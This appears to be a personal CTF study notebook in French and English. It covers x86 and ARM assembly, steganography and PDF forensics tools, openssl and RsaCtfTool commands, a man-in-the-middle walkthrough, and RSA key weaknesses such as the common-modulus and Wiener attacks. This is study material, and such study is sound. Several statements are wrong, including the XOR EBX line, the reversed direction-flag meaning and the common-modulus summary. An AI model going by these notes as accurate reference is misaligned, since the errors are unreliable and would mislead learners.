<p>

        
<img src="images/image278.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h3>                      MISC</h3>


<ul>

<li>ARM processors have two main states they can operate in (let’s not count Jazelle here), ARM and Thumb.
</li>
</ul>
<ul>

<li>Differences between ARM & Thumb : 
<ul>
 
<li>Instructions in ARM : 32-bit and Thumb : 16-bit (can be 32).
 
<li>All instructions in ARM state support conditional execution
 
<li>32-bit Thumb instructions have a .w suffix
</li> 
</ul>
</li> 
</ul>
<ul>

<li>ARM can only load a 8-bit value in one go.
<p>

    A full immediate value v is given by the formula: v = n ror 2*r
</p>
<p>

    because of the restriction in immediate value : 12 bits for this field
</p>
<p>

    In ARM instruction.
</p>
</li>
</ul>
<ul>

<li>In x86, we use PUSH and POP to load and store from and onto the Stack. In ARM, we can use these two instructions ( Pop/Push and Load/Store ).
</li>
</ul>
<ol>

<li>Assembleur x86
<p>

    
<img src="images/image279.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>In addition to the GPRs, EIP, and EFLAGS, there are also registers that control important low-level system mechanisms such as virtual memory, interrupts, and debugging. </strong>
<p>

            <strong>For example: </strong>
</p>
<ul>

<li><strong>CR0 controls whether paging is on or off.</strong>
<ul>

<li><strong>CR2 contains the linear address that caused a page fault.</strong>
<ul>

<li><strong>CR3 is the base address of a paging data structure.</strong>
<p>

                <strong> </strong>
</p>
<ul>

<li><strong>CR4 controls the hardware virtualization settings.</strong>
<p>

                <strong> </strong>
</p>
<ul>

<li><strong>DR0–DR7 are used to set memory breakpoints.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<ul>

<li><strong>When the operating system transitions from ring 3 to ring 0, it saves state information on the stack.</strong>
</li>
</ul>
<ul>

<li><strong>EFLAGS register : like CPSR in ARM.</strong>
<ul>

<li><strong>Little and big endian :</strong>
<p>

            
<img src="images/image280.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Instruction CALL [address] = PUSH “EIP” + Jump [address].</strong>
<ul>

<li><strong>Instruction LEAVE :</strong>
<p>

            <strong>EN résumé : MOVE ESP , EBP </strong>
</p>
<p>

            <strong>		POP EBP</strong>
</p>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Instruction PUSH [ REGISTRE ]: Pousse l’argument passé à PUSH au sommet de la pile et La valeur contenue dans ESP est mise sur le dessus de la pile.</strong>
</li>
</ul>
<ul>

<li><strong>Instruction POP [ REGISTRE ] : Retire l’élément au sommet de la pile et l’assigne à la valeur passée en argument. Le registre ESP qui pointe sur le sommet pointe à présent sur la valeur précédente sur la pile.</strong>
</li>
</ul>
<ul>

<li><strong>Appel d’une fonction en assembleur :</strong>
</li>
</ul>
<p>
<strong>				en résumé : push [ ], </strong>
</p>
<p>

                    <strong>       push [ ], </strong>
</p>
<p>

                        <strong>... 	</strong>
</p>
<p>
<strong>                                             call [ ]</strong>
</p>
<ul>

<li><strong>Prologue d’une fonction en assembleur :</strong> 
<ul>
 
<li><strong>en résumé : push %ebp, </strong>
<p>

                <strong>      	       mov  %esp, %ebp</strong>
</p>
<p>

                <strong>               sub [$0x.. ], %esp</strong>
</p>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>Epilogue d’une fonction en assembleur :</strong> 
<ul>
 
<li><strong>en résumé : leave ( ESP = EBP, remettre l’ancien EBP )</strong>
<p>

                <strong>      	       ret ( POP eip )</strong>
</p>
</li> 
</ul>
</li> 
</ul>
<p>
<strong>                                 Exemples d’instructions en x86</strong>
</p>

<table>
  <tr>
   <td><strong>ROR</strong>
   </td>
   <td><strong>Rotation vers la droite</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ROL</strong>
   </td>
   <td><strong>Rotation vers la gauche</strong>
   </td>
  </tr>
  <tr>
   <td><strong>INT X</strong>
   </td>
   <td><strong>Generate the interruption X ( “system_call” in linux )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>XOR EBX,EBX</strong>
   </td>
   <td><strong>Restore the EAX register</strong>
   </td>
  </tr>
  <tr>
   <td><strong>movl 0x80848c48(%ebx,%ecx,4), %eax  ( Syntaxe AT&T )</strong>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td><strong>movl (%esi), %eax ( Syntaxe AT&T )</strong>
   </td>
   <td><strong>EAX = *ESI  ( pointeur )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>movb %bl, (%edi) ( Syntaxe AT&T )</strong>
   </td>
   <td><strong>*EDI = bl ( sur seulement un octet car “movb” )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>int $0x80 ( Syntaxe AT&T )</strong>
   </td>
   <td><strong>interruption du programme ( return )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>movl entier, %eax ( Syntaxe AT&T )</strong>
   </td>
   <td><strong>eax = entier ( qui est une constante définie dans <em>data</em> )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>movb tableau(%esi), %al ( Syntaxe AT&T )</strong>
   </td>
   <td><strong>AL = *tableau + ESI</strong>
   </td>
  </tr>
  <tr>
   <td><strong>shl eax, 8</strong>
   </td>
   <td><strong>Shift left 8-bits</strong>
   </td>
  </tr>
  <tr>
   <td><strong>shr eax, 8</strong>
   </td>
   <td><strong>Shift right 8-bits</strong>
   </td>
  </tr>
  <tr>
   <td><strong>movsd</strong>
   </td>
   <td><strong>Special <em>mov </em>instruction : implicitly use EDI/ESI as the destination/source address, respectively.</strong>
<p>
<strong>Usually Use to copy/paste string.</strong>
<p>
<strong>In addition, they also automatically update the source/destination address depending on the direction flag (DF) in EFLAGS.</strong>
<p>
<strong>DF = 0 : the addresses are decremented</strong>
<p>
<strong>DF = 1 : the addresses are incremented</strong>
<p>
<strong>In some cases, they are accompanied by the REP prefix (<em>rep movsd)</em>, which repeats an instruction up to ECX times. </strong>
   </td>
  </tr>
  <tr>
   <td><strong>lea edi, [ebx+170h]</strong>
   </td>
   <td><strong>edi = ebx+0x170 ( direct value of ebx )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>mov esi, offset _RamsdiskBoot</strong>
   </td>
   <td><strong>ESI = pointer to RamdiskBootDiskGuid</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SCAS ( pour comparaison )</strong>
   </td>
   <td><strong>SCAS implicitly compares AL/AX/EAX</strong>
<p>
<strong>with data starting at the memory address EDI.</strong>
<p>
<strong>EDI is automatically incremented/</strong>
<p>
<strong>decremented depending on the DF bit in EFLAGS.</strong>
<p>
<strong>SCAS is commonly used along with the REP prefix to find a byte, word, or double-word in </strong>
<p>
<strong>a buffer.</strong>
<p>
<strong>This instructions can operate at 1-, 2-, or 4-byte granularity ( b,w or d suffix ).</strong>
<p>
<strong>Example : </strong>
<p>
<strong>“repne scasb”</strong>
<ul>

<li><strong>Repeatedly scan forward one byte at a time as long as AL ( one byte ) does not match the byte at EDI.</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td><strong>STOS ( pour écrire )</strong>
   </td>
   <td><strong>STOS is the same as SCAS except that it writes the value AL/AX/EAX to EDI with ECX used as counter with the loop instruction “<em>rep</em>”.</strong>
<p>
<strong>It is commonly used to initialize a buffer to a constant value.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>LODS</strong>
   </td>
   <td><strong>It reads a 1-, 2-, or 4-byte </strong>
<p>
<strong>value from ESI and stores it in AL, AX, or EAX.</strong>
   </td>
  </tr>
</table>


<p>

            <strong>			</strong>
</p>
<ul>

<li><strong>En AT&T, Les constantes en base</strong>
<p>

            <strong>16 commençant par 0x et les constantes en binaire par 0b.</strong>
</p>
<ul>

<li><strong>Le système d’exploitation met à la disposition du</strong>
<p>

            <strong>programmeur un ensemble de routines ( exemple : <em>int $0x80 </em>qui provoque un <em>return</em> ) pour que chacun ne soit pas obligé de les réécrire à chaque fois. La valeur placée dans EAX détermine le choix de la routine utilisée.</strong>
</p>
<ul>

<li><strong>le code retour d’un programme x86 est souvent la valeur</strong>
<p>

            <strong>placée dans EBX.</strong>
</p>
<p>

            <strong>	        Utilisation des registres sur un Syscall</strong>
</p>
<p>

            
<img src="images/image281.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Les adresses des routines correspondant à toutes les interruptions sont stockées dans une zone de la</strong>
<p>

            <strong>mémoire dite table des vecteurs d'interruption.</strong>
</p>
<p>

            <strong>Chaque type d’interruption est associé à une case de cette table qui contient simplement l’adresse de la routine à exécuter.</strong>
</p>
<ul>

<li><strong>A x86 processor can operate in two modes: real and protected. </strong>
<p>

            <strong>Real mode is the processor state when it is first powered on and only supports a 16-bit instruction set.</strong>
</p>
<p>

            <strong>Protected mode is the processor state supporting virtual memory, paging, and other features; it is the state in which modern operating systems execute.</strong>
</p>
<ul>

<li><strong>x86 supports the concept of privilege separation through an abstraction called <em>ring level</em>. </strong>
<p>

            <strong>The processor supports four ring levels, numbered from 0 to 3 (Rings 1 and 2 are not commonly used).</strong>
</p>
<p>

            <strong>Ring 0 is the highest privilege level and can modify all system settings. Ring 3 is the lowest privileged level and can only read/modify a subset of system settings.</strong>
</p>
<p>

            <strong>The ring level is encoded in the CS register.</strong>
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Opération Multiplication :</strong> 
<ul>
 
<li><strong>Le produit de 2 nombres de 32 bits occupe 64 bits. Dans tous les cas, les 32 bits de poids fort seront placées dans EDX.</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li><strong>Pour la multiplication non signée, la syntaxe est:</strong>
<p>

                <strong><em>mul &lt;opérande>.</em></strong>
</p>
<p>

                <strong>The register is multiplied with AL, AX, or EAX and the result is stored in AX, DX:AX, or EDX:EAX, depending on the operand width :</strong>
</p>
<p>

                <strong>Example :</strong>
</p>
<p>

                <strong>mul ecx ; EDX:EAX = EAX * ECX</strong>
</p>
<p>

                <strong>mul cl  ; AX = AL * CL</strong>
</p>
<p>

                <strong>mul dx ; DX:AX = AX * DX</strong>
</p>
<ul>

<li><strong>Pour la multiplication signée, il y trois syntaxes :</strong>
<p>

            
<img src="images/image282.png" width="" alt="alt_text" title="image_tooltip">

</p>
</li>
</ul>
</li>
</ul>
<p>

            <strong>Taille des opérande en AT&T :</strong>
</p>
<p>

<img src="images/image283.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>				    </strong>
</p>
<p>
<strong>Conditional Jump in x86</strong>
<img src="images/image284.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image285.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

        <strong>		</strong>
</p>
<p>

                <strong>Quelques Bits du Registre d’état et instructions</strong>
</p>

<table>
  <tr>
   <td><strong>ZF (zero flag) </strong>
   </td>
   <td><strong>Positionnée par une opération arithmétique </strong>
<p>
<strong>( égal à zéro ) ou une comparaison en cas d’égalité (mais pas par un déplacement).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>CF (carry flag)</strong>
   </td>
   <td><strong>Positionné par une opération arithmétique lorsque le résultat dépasse la taille</strong>
<p>
<strong>de registre concerné.</strong>
<p>
<strong>exemple : </strong>
<p>
<strong>si on ajoute 2 registres de 8 bits, contenant 0xFF et 1, le résultat (en théorie 0x100)</strong>
<p>
<strong>vaut 0 donc CF est positionnée (ZF aussi dans ce cas la)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SF (sign flag)</strong>
   </td>
   <td><strong>Positionnée par une opération arithmétique dont le résultat est négatif ou une</strong>
<p>
<strong>comparaison dans le cas ou le 1er opérande est le plus grand (mais pas par un déplacement).</strong>
<p>
<strong>exemple : si on soustrait 2 registres de 8 bits, contenant 0x1F et 0x20, le résultat ( -1) vaut OxFF donc SF est positionnée.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>OF (overflow flag)</strong>
   </td>
   <td><strong>Indique qu’un calcul a débordé sur le bit de signe. exemple : si on ajoute</strong>
<p>
<strong>2 registres de 8 bits, contenant 0x7A et 0x21, le résultat vaut OxFF (donc -1) ; </strong>
<p>
<strong>OF est alors positionnée. (SF aussi). Si on considère que les nombres sont signées, OF indique bien un problème.</strong>
<p>
<strong>Si on les considère non signés, OF est inutile.</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li><strong>EFLAGS ( or ps ) ( current state of the processor ) in x86:</strong>
</li>
</ul>
<p>
<strong>general-purpose registers in x86  and  x86-64:</strong>
</p>
<p>

<img src="images/image286.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image287.png" width="" alt="alt_text" title="image_tooltip">

</p>
<h3>                    MISC</h3>


<ul>

<li>The x86 architecture has 8 General-Purpose Registers (GPR), 6 Segment Registers, 1 Flags Register and an Instruction Pointer. 64-bit x86 has additional registers.
</li>
</ul>
<ul>

<li>EAX, EBX, ECX, EDX, ESI, EDI = general-purpose registers.
<p>

            Rouge = Registres d’adresses.
</p>
<p>

            Il est à noter que rien n’interdit à un registre d’adresse de contenir une donnée (et vice-versa).
</p>
</li>
</ul>
<ol>

<li>Stéganographie
</li>
</ol>
<ul>

<li><strong>Parfois , les premiers bits des images (LSB) sont utilisés pour stocker des données.</strong>
</li>
</ul>
<h3> 				  Steganography tools</h3>



<table>
  <tr>
   <td><strong><a href="https://fotoforensics.com/">https://fotoforensics.com/</a></strong>
   </td>
   <td><strong>Website where you can submit a JPEG or PNG file for Forensic or stegano analysis.</strong>
   </td>
  </tr>
  <tr>
   <td><strong><a href="https://hexed.it/">https://hexed.it/</a></strong>
   </td>
   <td><strong>The powerful online hex analysis and editor.</strong>
   </td>
  </tr>
  <tr>
   <td><strong><a href="https://stylesuxx.github.io/steganography/">https://stylesuxx.github.io/steganography/</a></strong>
   </td>
   <td><strong>Try to find a hidden text message in an image.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>https://aperisolve.fr/</strong>
   </td>
   <td><strong>Very great site for image analysis</strong>
   </td>
  </tr>
  <tr>
   <td><strong>zsteg</strong>
   </td>
   <td><strong>Detect stegano-hidden data in PNG & BMP</strong>
<p>

<img src="images/image288.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
  <tr>
   <td><strong>peepdf</strong>
   </td>
   <td><strong>Outil d'analyse de pdf (avec un mode interactif) Très utile pour tracer les liens des catalogues, stream, objects, ...</strong>
   </td>
  </tr>
  <tr>
   <td><strong>pdf-parser</strong>
   </td>
   <td><strong>Utile pour parser/analyser des fichiers PDF </strong>
   </td>
  </tr>
  <tr>
   <td><strong>pdf-parser --stats [PDF_FILE]</strong>
   </td>
   <td><strong>Voir si il y a des objet cachée dans le PDF</strong>
   </td>
  </tr>
  <tr>
   <td><strong>pdf-parser --object [NUMBER] --raw --filter [PDF_FILE] </strong>
   </td>
   <td><strong>extract object from PDF</strong>
   </td>
  </tr>
  <tr>
   <td><strong>zip -FF [ZIP_FILE] --out [ZIP_FILE]</strong>
   </td>
   <td><strong>check the file and fix it if needed</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>

            <strong>               </strong>
</p>
<h3>
                      Some useful commands</h3>



<table>
  <tr>
   <td><strong>strings [OPTIONS] [FILENAME]</strong>
   </td>
   <td><strong>Prints the strings of printable characters in files ( by defaults,﻿print character sequences that are at least 4 characters long ) .</strong>
<p>
<strong>﻿If you want, you can change this limit using the -n command line option:</strong>
<p>
<strong>strings -n 2 test &lt;- 2 characters</strong>
   </td>
  </tr>
  <tr>
   <td><strong>﻿</strong>
<p>
<strong>strings -a test</strong>
   </td>
   <td><strong>reads the complete file (and not just loadable, initialized data sections), use the -a command line option.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>hexdump [FILENAME]</strong>
   </td>
   <td><strong>Allow you to print out the file in hex format.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>exiftool [IMAGE_NAME]</strong>
   </td>
   <td><strong>Print metadata of the image</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ol>

<li>Cryptographie
</li>
</ol>
<h3>				  			 Cryptography tools</h3>



<table>
  <tr>
   <td><strong><a href="https://8gwifi.org/rsafunctions.jsp">https://8gwifi.org/rsafunctions.jsp</a></strong>
   </td>
   <td><strong>RSA Encryption / Decryption ( by providing Public/Private Key ) </strong>
   </td>
  </tr>
  <tr>
   <td><strong>﻿<a href="http://www.factordb.com/">http://www.factordb.com/</a></strong>
   </td>
   <td><strong>Try to Factorize number</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<p>

                <strong>   </strong>
</p>
<h3>
                  Useful Commands</h3>



<table>
  <tr>
   <td><strong>openssl rsa -in pubkey.pem -pubin -text -modulus</strong>
   </td>
   <td><strong>extract Modulus ( in hexa ) and Exponent from the provided RSA public key.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>openssl rsautl -decrypt -in [FILE_WITH_CRYPTED_DATA] -out ./decrypt.txt -inkey private.pem</strong>
   </td>
   <td><strong>Decrypt with a RSA private key</strong>
   </td>
  </tr>
  <tr>
   <td><strong>python3 RsaCtfTool.py --createpub -n [NUMBER] -e [NUMBER]</strong>
   </td>
   <td><strong>Generate a public key from n et e ( with RsaCtfTool )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>python3 rsa-cm.py -c1 [MSG_CHIFFRE1] -c2 [MSG_CHIFFRE2] -k1 [KEY1_PUB] -k2 </strong>
<p>
<strong>[KEY2_PUB]</strong>
   </td>
   <td><strong>RSA common modulus attack avec rsa-cm.py</strong>
<p>
<strong>Sachant que les deux messages clairs sont les mêmes.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>openssl rsa -in [KEY_PUB] -pubin -text -noout</strong>
   </td>
   <td><strong>Afficher module exposant d’une clef publique</strong>
   </td>
  </tr>
  <tr>
   <td><strong>openssl rsautl -in [INPUT_FILE] -out [OUTPUT_FILE] -pubin -inkey [PUBKEY] -encrypt</strong>
   </td>
   <td><strong>Encrypt with public Key </strong>
   </td>
  </tr>
  <tr>
   <td><strong>openssl rsa -in mykey.pem -pubout > mykey.pub</strong>
   </td>
   <td><strong>extract public key from private key</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<h3>
        Catégorisation d'algorithmes cryptographique</h3>



<table>
  <tr>
   <td><strong>Algorithme symétrique </strong>
   </td>
   <td><strong>AES, RC5, DES, Triple DES, Blowfish, Serpent, Twofish</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Algorithme asymétrique </strong>
   </td>
   <td><strong>RSA, DSA, El gamal</strong>
   </td>
  </tr>
</table>



<table>
  <tr>
   <td><strong>Chiffrement par Bloc ( M est traité par blocs de données )</strong>
   </td>
   <td><strong>DES, Triple DES, AES, RC6, RC5, IDEA, BLOWFISH, RSA</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Chiffrement par flot ( M est traité bit par bit )</strong>
   </td>
   <td><strong>RC4, Bluetooth E0/1, GSM A5/1</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Différent mode opératoire</strong>
   </td>
   <td><strong>ECB, CBC, GCM, CCM, CTR, XTS</strong>
   </td>
  </tr>
</table>


<ul>

<li><strong>El gamal => basé sur le logarithme discret</strong>
</li>
</ul>
<h3>         Taille de différents Hash :</h3>



<table>
  <tr>
   <td><strong>MD5</strong>
   </td>
   <td><strong>16 octets ( 32 caractères )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SHA-1</strong>
   </td>
   <td><strong>20 octets ( 40 caractères )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SHA-224</strong>
   </td>
   <td><strong>28 octets ( 56 caractères )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SHA-256</strong>
   </td>
   <td><strong>32 octets ( 64 caractères )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SHA-384</strong>
   </td>
   <td><strong>48 octets ( 96 caractères )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>SHA-512</strong>
   </td>
   <td><strong>64 octets ( 128 caractères )</strong>
   </td>
  </tr>
</table>


<p>
<strong>En général, les condensats sont écrits en Hexa.</strong>
</p>
<ul>

<li>Man In The Middle 
</li>
</ul> 
<ul>
 
<li><strong>Cas normal ( sans attaque )</strong>  
<ul>
  
<li><strong>1 </strong>- Alice<strong> et Bob échangent leur clé publique. Charles peut les lire, il connaît donc <em>kapublic</em> et <em>kbpublic</em>.</strong>  
<ul>
  
<li><strong>2 </strong>- Si<strong> Alice veut envoyer un </strong>message à Bob,<strong> elle chiffre ce message avec kbpublic. Bob le déchiffre avec<em> kbprivate</em>.</strong>  
<ul>
  
<li><strong>3 </strong>- Charles,<strong> qui ne possède que<em> kbpublic</em>, ne peut pas lire le message.</strong> 
<ul>
 
<li><strong>Attaque : Admettons maintenant que Charles soit en mesure de modifier les échanges entre Alice et Bob:</strong>  
<ul>
  
<li><strong>1 – Bob envoie sa clé publique à Alice. Charles l’intercepte et renvoie à Alice sa propre clé publique <em>kcpublic</em> en se faisant passer pour Bob.</strong>  
<ul>
  
<li><strong>2 – Lorsque Alice veut envoyer un message à Bob, elle utilise donc, sans le savoir, la clé de Charles.</strong>  
<ul>
  
<li><strong>3 – Alice chiffre le message avec la clé publique </strong>
<p>

                    <strong>de Charles et l’envoie à celui qu’elle croit être Bob.</strong>
</p>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>  
<ul>
  
<li><strong>4 – Charles intercepte le message, le déchiffre avec sa clé privée <em>kcprivate</em> et peut lire le message.</strong>  
<ul>
  
<li><strong>5 – Puis il chiffre de nouveau le message avec la clé publique de Bob <em>kbpublic</em>, après l’avoir éventuellement modifié.</strong>  
<ul>
  
<li><strong>6 – Bob déchiffre son message avec sa clé privée et ne se doute de rien puisque cela fonctionne.</strong>
<p>

                <strong>Ainsi, Alice et Bob sont chacun persuadés d’utiliser la clé de l’autre, alors qu’ils utilisent en réalité tous les deux la clé de Charles.</strong>
</p>
<p>

                <strong>Dans un cas réel , un attaquant peut être par exemple un routeur. </strong>
</p>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
<ul>

<li>RSA :
<h4>
            Intro :</h4>


</li>
</ul> 
<ul>
 
<li><strong>The idea of RSA is based on the fact that it is difficult to factorize a large integer.		</strong>
</li> 
</ul>
<p>
<strong>				The public key consists of two numbers where one </strong>
</p>
<p>

                <strong>number is multiplication of two large prime numbers.</strong>
</p>
<p>

                <strong>And private </strong>keys are<strong> also derived from the same two prime</strong> <strong>numbers.</strong>
</p>
<p>

                <strong>﻿So if somebody can factorize the large number (  multiplication of two large prime numbers ), the private </strong>key is compromised<strong>. </strong>
</p> 
<ul>
 
<li><strong>Encryption strength totally lies on the key size and if we double or triple the key size, the strength of encryption increases exponentially.</strong> 
<ul>
 
<li><strong>RSA keys can be typically 1024 or 2048 bits long ( That number is the number of bits in the modulus ), but experts believe that 1024 bit keys could be broken in the near future. But till now it seems to be an infeasible task.</strong> 
<ul>
 
<li><strong>Note : Deux nombres entiers sont premiers entre eux si leur PGCD (Plus Grand Commun Diviseur) vaut 1.</strong> 
<ul>
 
<li>Déroulement de l’algorithme :  
<ul>
  
<li><strong>Alice choisit deux grands entiers naturels premiers p et q (d'environ 100 chiffres chacun ou plus) et fait leur produit n = p·q. Puis elle choisit un entier e tel que : </strong>   
<ul>
   
<li><strong>e premier avec (p-1)·(q-1).</strong>
   
<li><strong>e &lt; (p-1)(q-1).</strong>
   
<li><strong>e premier avec n.</strong>
   
<li><strong>e &lt; p et q.</strong>
<p>

                <strong>Enfin, elle publie dans un annuaire, par exemple</strong>
</p>
<p>

                <strong>sur le web, sa clef publique: (RSA, n, e).</strong>
</p>
<p>

                    <strong>n est appelé module de chiffrement.</strong>
</p>
<p>

                    <strong>e est appelé exposant de chiffrement.</strong>
</p>
</li>   
</ul>
</li>   
</ul>
</li>   
</ul>
</li>   
</ul>
</li>   
</ul>
</li>   
</ul>
<p>
<strong>				Chiffrement :</strong>
</p>
<ul>

<li><strong>Bob veut donc envoyer un message à Alice. Il cherche dans l'annuaire la clef de chiffrement qu'elle a publiée. </strong>
<p>

                    <strong>Il sait maintenant qu'il doit utiliser le système RSA avec les deux entiers n et e.</strong>
</p>
<p>

                    <strong>Il transforme en nombres son message en remplaçant par exemple chaque lettre par son rang dans l'alphabet.</strong>
</p>
<p>

                    <strong>Exemple :</strong>
</p>
<p>

                    <strong>"JEVOUSAIME" devient : "10 05 22 15 21 19 01 09 13 05".</strong>
</p>
<p>

                    <strong>Puis il découpe son message chiffré en blocs de même longueur représentant chacun un nombre plus petit que n.</strong>
</p>
<p>

                    <strong>Il faut construire des blocs assez longs (par exemple si on laissait des blocs de 2 dans notre exemple), on retomberait sur un simple chiffre de substitution que l'on pourrait attaquer par l'analyse des fréquences.</strong>
</p>
<p>

                    <strong>Imaginons dans notre exemple que son message devient : "010 052 215 211 901 091 305".</strong>
</p>
<p>

                    <strong>Un bloc B est chiffré par la formule C = B^e mod n, où C est un bloc du message chiffré que Bob enverra à Alice.</strong>
</p>
<p>

                    <strong>Après avoir chiffré chaque bloc, le message chiffré s'écrit : "0755 1324 2823 3550 3763 2237 2052".</strong>
</p>
</li>
</ul>
<p>

                <strong>Déchiffrement :	</strong>
</p>
<p>
<strong>					Alice reçoit le message chiffré avec sa clef </strong>
</p>
<p>

                <strong>publique.</strong>
</p>
<ul>

<li><strong>Alice calcule à partir de p et q, qu'elle a gardé secret, la clef d de déchiffrage (c'est sa clef privée). Celle-ci doit satisfaire l'équation : </strong>
<p>

                    <strong>e·d mod ( (p-1)(q-1) ) = 1. </strong>
</p>
<p>

                    <strong>Ici, d=4279.</strong>
</p>
<p>

                    <strong>Chacun des blocs C du message chiffré sera déchiffré par la formule B = C^d mod n.</strong>
</p>
<p>

                    <strong>d est appelé module de déchiffrement.</strong>
</p>
<ul>

<li><strong>Elle retrouve : "010 052 215 211 901 091 305".</strong>
<p>

                    <strong>Ainsi, </strong>en regroupant<strong> les chiffres deux par deux et en remplaçant les nombres ainsi obtenus par les lettres correspondantes, elle retourne le message d’origine.</strong>
</p>
<ul>

<li><strong>RSA implementation may have vulnerabilities of its own even if the used keys are secur</strong>e
</li>
</ul>
</li>
</ul>
</li>
</ul> 
<ul>
 
<li>Attacking RSA keys	
<ul>

<li><strong>Modulus too small ( n )</strong>
<p>

                    <strong>If the RSA key is too short, the modulus can be factored by just using brute force. At least, 1024-bit keys are required.</strong>
</p>
<p>

                    <strong>( but may be possible for well equipped attackers to bruteforce this length of key ). </strong>
</p>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Low private exponent ( d )</strong>
<p>

                    <strong>Decrypting a message consists of calculating C^d mod N. The smaller d is, the faster this operation goes. </strong>
</p>
<p>

                    <strong>However, <em>Wiener</em> found a way to recover d when d is relatively small. </strong>
</p>
<p>

                    <strong><em>Boneh</em> and <em>Durfee</em> improved this attack to recover private exponents that are less than N^0.292.</strong>
</p>
<p>

                    <strong>If the private exponent is small, the public exponent is necessarily large. </strong>
</p>
<p>

                    <strong>If you encounter a public key with a large public exponent, it may be worth it to run the Boneh-Durfee attack against it.</strong>
</p>
<ul>

<li><strong>Low public exponent ( e )</strong>
<p>

                    <strong>﻿Having a low public exponent makes the system vulnerable to certain attacks if used incorrectly.</strong>
</p>
<ul>

<li><strong>p and q close together</strong>
<p>

                    <strong>﻿Consider what happens when p ≈ q. Then N ≈ p^2 or p ≈ √N. In that case, N can be efficiently factored using Fermat’s factorization method.</strong>
</p>
<ul>

<li><strong>Unsafe primes</strong>
<p>

                    <strong>﻿﻿If at least one of the primes conforms to certain conditions there is a shortcut to factor the result.</strong>
</p>
<p>

                    <strong>In practice the chance is negligible that a prime you pick at random conforms to one of these formats.</strong>
</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>

<img src="images/image289.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>Unsafe random generator values</strong>
</li>
</ul>
<p>
<strong>					To create a random key, a good cryptographic </strong>
</p>
<p>

                    <strong>random number generator is required. Some generators are deficient.</strong>
</p>
<p>

                    <strong>For example, Devices that create their private key on first boot may not have enough entropy to create a random number. What sometimes happens is that this results in keys that have a different modulus but have one factor in common. </strong>
</p>
<p>

                    <strong>In that case the greatest common divisor of the two modulus can be efficiently calculated to factor the modulus and recover the private key.</strong>
</p>
<p>

                    <strong>In some cases, even if two keys don’t have the exact same factor but the factor is close, both keys can be broken.</strong>
</p>
<ul>

<li><strong>If you have :</strong> 
<ul>
 
<li><strong>The message m1 encrypted with a PubKey1</strong>
 
<li><strong>The message m1 encrypted with a PubKey2</strong>
 
<li><strong>PubKey1 and PubKey2 have the same modulus.</strong>
<p>

                    <strong>	</strong>
</p>
<p>

                    <strong>Then, you can recover the plain text m1 with the private key.</strong>
</p>
</li> 
</ul>
</li> 
</ul>
<p>
<strong>-------------------------------------------------------------------</strong>
</p>
<ul>

<li><strong>Faire attention au stockage des mots de passe de certains logiciels ( Navigateur , … ). Ils peuvent être retrouvés avec certains utilitaires employé par un attaquant.</strong>
</li>
</ul>
<ul>

